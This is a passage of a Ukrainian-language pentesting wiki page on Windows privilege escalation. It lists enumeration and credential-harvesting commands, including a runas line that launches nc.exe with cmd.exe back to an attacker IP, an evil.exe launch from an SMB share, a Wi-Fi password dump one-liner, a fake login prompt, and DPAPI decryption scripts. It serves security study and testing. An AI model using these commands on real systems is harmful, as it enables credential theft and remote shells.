{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Мережа

### Ресурси
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### файл hosts

Перевірте наявність інших відомих комп'ютерів, які зафіксовані у файлі hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси та DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте **обмежені сервіси** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Таблиця ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила брандмауера

[**Перевірте цю сторінку для команд, пов'язаних з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(список правил, створення правил, вимкнення, вимкнення...)**

Більше [команд для мережевого переліку тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте користувача root, ви зможете слухати будь-який порт (перший раз ви використовуєте `nc.exe` для прослуховування порту, він запитає через GUI, чи слід дозволити `nc` через брандмауер).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Для легкого запуску bash в режимі root ви можете спробувати `--default-user root`

Ви можете досліджувати файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Облікові дані Windows

### Облікові дані Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Менеджер облікових даних / Сховище Windows

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Сховище Windows зберігає облікові дані користувачів для серверів, веб-сайтів та інших програм, які **Windows** може **автоматично увійти в систему для користувачів**. На перший погляд, це може виглядати так, що користувачі можуть зберігати свої облікові дані Facebook, облікові дані Twitter, облікові дані Gmail тощо, щоб автоматично увійти через браузери. Але це не так.

Сховище Windows зберігає облікові дані, які Windows може автоматично увійти для користувачів, що означає, що будь-яка **програма Windows, яка потребує облікових даних для доступу до ресурсу** (сервера або веб-сайту) **може використовувати цей Менеджер облікових даних** та Сховище Windows і використовувати надані облікові дані замість того, щоб користувачі постійно вводили ім'я користувача та пароль.

Якщо програми не взаємодіють з Менеджером облікових даних, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Тому, якщо ваша програма хоче скористатися сховищем, вона повинна якимось чином **спілкуватися з менеджером облікових даних та запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Використовуйте `cmdkey`, щоб переглянути збережені облікові дані на машині.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Потім ви можете використовувати `runas` з параметрами `/savecred`, щоб використовувати збережені облікові дані. Наведений нижче приклад викликає віддалений бінарний файл через SMB-ресурс.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` з наданим набором облікових даних.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу, що mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), або з [модуля Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**API захисту даних (DPAPI)** надає метод симетричного шифрування даних, переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує користувацький або системний секрет для значного внеску в ентропію.

**DPAPI дозволяє шифрування ключів за допомогою симетричного ключа, який походить від секретів входу користувача**. У сценаріях, що включають системне шифрування, воно використовує секрети аутентифікації домену системи.

Зашифровані користувацькі ключі RSA, використовуючи DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` представляє [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security\_Identifier) користувача. **Ключ DPAPI, розташований поруч з головним ключем, який захищає приватні ключі користувача в одному файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зауважити, що доступ до цього каталогу обмежений, що запобігає переліку його вмісту через команду `dir` в CMD, хоча його можна переглянути через PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використовувати **модуль mimikatz** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`) для розшифрування його.

**Файли облікових даних, захищені майстер-паролем**, зазвичай розташовані в:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використовувати **модуль mimikatz** `dpapi::cred` з відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато DPAPI** **masterkeys** з **пам'яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви користувач з правами root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптів** та завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Ці облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому ж комп'ютері, на якому вони були створені.

Для **розшифрування** облікових даних PS з файлу, що їх містить, ви можете виконати:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені підключення RDP

Ви можете знайти їх за шляхом `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Недавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Менеджер облікових даних віддаленого робочого столу**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте модуль **Mimikatz** `dpapi::rdg` з відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
Ви можете **витягти багато головних ключів DPAPI** з пам'яті за допомогою модуля Mimikatz `sekurlsa::dpapi`

### Прикріплені нотатки

Люди часто використовують додаток StickyNotes на робочих станціях з Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і завжди варто його шукати та вивчати.

### AppCmd.exe

**Зверніть увагу, що для відновлення паролів з AppCmd.exe вам потрібно бути адміністратором та запускати під рівнем високої цілісності.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, то можливо, що деякі **підказки** були налаштовані та можуть бути **відновлені**.

Цей код був витягнутий з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та Реєстр (Облікові дані)

### Облікові дані Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Ключі хоста SSH Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ключі в реєстрі

SSH приватні ключі можуть бути збережені в середині ключа реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тому вам слід перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, буде збережений ключ SSH. Він зберігається зашифрованим, але може бути легко розшифрований за допомогою [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Додаткова інформація про цю техніку тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася при завантаженні, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Схоже, що ця техніка більше не є дійсною. Я спробував створити деякі ssh-ключі, додати їх за допомогою `ssh-add` та увійти через ssh на машину. Реєстр HKCU\Software\OpenSSH\Agent\Keys не існує, і procmon не виявив використання `dpapi.dll` під час аутентифікації асиметричним ключем.
{% endhint %}

### Неочікувані файли
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum\_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM та SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Хмарні облікові дані
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Шукайте файл під назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортання користувацьких облікових записів локальних адміністраторів на групу машин через Групову політику (GPP). Однак цей метод мав значні недоліки з точки зору безпеки. По-перше, об'єкти групової політики (GPO), збережені у вигляді файлів XML в SYSVOL, можуть бути доступні будь-якому користувачеві домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 з використанням публічно документованого ключа за замовчуванням, можуть бути розшифровані будь-яким аутентифікованим користувачем. Це становить серйозний ризик, оскільки це може дозволити користувачам отримати підвищені привілеї.

Для зменшення цього ризику була розроблена функція для пошуку локально кешованих файлів GPP, що містять поле "cpassword", яке не є порожнім. Після знаходження такого файлу функція розшифровує пароль і повертає спеціальний об'єкт PowerShell. Цей об'єкт містить відомості про GPP та місцезнаходження файлу, що допомагає в ідентифікації та усуненні цієї уразливості безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Для розшифрування cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Конфігурація веб-сайту IIS
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Облікові дані OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Логи
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запитайте про облікові дані

Ви завжди можете **запитати користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо ви вважаєте, що він може їх знати (зверніть увагу, що **пряме запитання** клієнта про **облікові дані** є дуже **ризикованим**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **чистому тексті** або у **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Пошук усіх запропонованих файлів:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані в кошику

Вам також слід перевірити кошик, щоб знайти облікові дані всередині нього.

Для **відновлення паролів**, збережених декількома програмами, ви можете використовувати: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### У реєстрі

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Видобуття ключів openssh з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Вам слід перевірити бази даних, де зберігаються паролі з **Chrome або Firefox**.\
Також перевірте історію, закладки та улюблені веб-сторінки браузерів, можливо, там зберігаються деякі **паролі**.

Інструменти для видобутку паролів з браузерів:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Перезапис COM DLL**

**Component Object Model (COM)** - це технологія, вбудована в операційну систему Windows, яка дозволяє **взаємодіяти** між компонентами програмного забезпечення різних мов. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент використовує функціональність через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IIDs).

Класи та інтерфейси COM визначаються в реєстрі під **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** та **HKEY\_**_**CLASSES\_**_**ROOT\Interface** відповідно. Цей реєстр створюється шляхом об'єднання **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

У CLSIDs цього реєстру ви можете знайти дочірній реєстр **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL** та значення з назвою **ThreadingModel**, яке може бути **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (одно або багато) або **Neutral** (потік нейтральний).

![](<../../.gitbook/assets/image (638).png>)

Зазвичай, якщо ви можете **перезаписати будь-які з DLL**, які будуть виконані, ви можете **підвищити привілеї**, якщо цю DLL буде виконано іншим користувачем.

Щоб дізнатися, як злочинці використовують COM Hijacking як механізм постійності, перегляньте:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Загальний пошук паролів у файлах та реєстрі**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу за певною назвою файлу**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Пошук у реєстрі назв ключів та паролів**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти, які шукають паролі

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**, який я створив для **автоматичного виконання кожного модуля metasploit POST, який шукає облікові дані** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) - ще один чудовий інструмент для вилучення паролів з системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** та **паролі** з декількох інструментів, які зберігають ці дані у відкритому вигляді (PuTTY, WinSCP, FileZilla, SuperPuTTY та RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Витік обробників

Уявіть, що **процес, який працює як SYSTEM, відкриває новий процес** (`OpenProcess()`) з **повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковує всі відкриті обробники основного процесу**.\
Отже, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий обробник привілейованого процесу, створеного** за допомогою `OpenProcess()` та **впровадити shellcode**.\
[Прочитайте цей приклад для отримання більш детальної інформації про **те, як виявити та використати цю уразливість**.](leaked-handle-exploitation.md)\
[Прочитайте цей **інший пост для більш повного пояснення того, як тестувати та зловживати більшою кількістю відкритих обробників процесів та потоків, успадкованих з різними рівнями дозволів (не тільки повний доступ)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імітація клієнта з іменованими каналами

Спільні сегменти пам'яті, відомі як **канали**, дозволяють взаємодію процесів та передачу даних.

Windows надає функцію під назвою **Іменовані канали**, що дозволяє неспорідненим процесам обмінюватися даними, навіть через різні мережі. Це нагадує архітектуру клієнт-сервер, з ролями, визначеними як **іменований канал сервера** та **іменований канал клієнта**.

Коли дані надсилаються через канал клієнтом, **сервер**, який налаштував канал, може **прийняти ідентичність** **клієнта**, якщо він має необхідні **права SeImpersonate**. Виявлення **привілейованого процесу**, який спілкується через канал, який ви можете імітувати, надає можливість **отримати вищі привілеї**, приймаючи ідентичність цього процесу, коли він взаємодіє з каналом, який ви створили. Інструкції щодо виконання такого нападу можна знайти [**тут**](named-pipe-client-impersonation.md) та [**тут**](./#from-high-integrity-to-system).

Також наступний інструмент дозволяє **перехоплювати комунікацію через іменований канал за допомогою інструменту, такого як burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **і цей інструмент дозволяє переглядати та переглядати всі канали для пошуку підвищення привілеїв** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Різне

### **Моніторинг командних рядків для паролів**

Отримавши оболонку як користувач, можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані через командний рядок**. Сценарій нижче захоплює командні рядки процесів кожні дві секунди та порівнює поточний стан з попереднім, виводячи будь-які відмінності.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Викрадення паролів з процесів

## Від низькопривілейованого користувача до NT\AUTHORITY SYSTEM (CVE-2019-1388) / Ухилення від UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можливо запустити термінал або будь-який інший процес, такий як "NT\AUTHORITY SYSTEM" від непривілейованого користувача.

Це дозволяє підвищити привілеї та ухилитися від UAC одночасно за допомогою однієї й тієї ж вразливості. Крім того, немає потреби встановлювати що-небудь, а використаний під час процесу бінарний файл підписаний і виданий Microsoft.

Деякі з постраждалих систем наступні:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
